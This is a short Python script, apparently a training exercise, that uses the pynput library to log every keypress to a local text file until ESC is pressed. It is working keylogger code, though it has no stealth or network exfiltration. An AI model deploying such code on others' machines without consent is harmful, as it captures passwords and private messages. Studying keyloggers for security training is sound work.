# Import necessary modules from the pynput library
from pynput.keyboard import Key, Listener
import os

# Specify the custom directory and log file name
log_dir = "/home/phoenix/Downloads/PRODIGY_CS_02/logs" # change username to your actual username
log_file = os.path.join(log_dir, "key_log.txt") #combine the directory and filename

# Ensure the log direcory exists, or create a new one
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Define a function that handles key presses
def on_press(key):
    # Open the file in append mode
    with open(log_file, "a") as f:
        try:
            # Try to write the key character to the file (for letters, numbers, etc.)
            f.write(key.char)
        except AttributeError:
            # If the key has no character (e.g., special keys), write its name instead
            f.write(f"[{key}]")

# Define a function to handle key release (optional)
def on_release(key):
    # Stop the listener if the ESC key is released
    if key == Key.esc:
        return False

# Set up the listener to monitor keyboard input
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
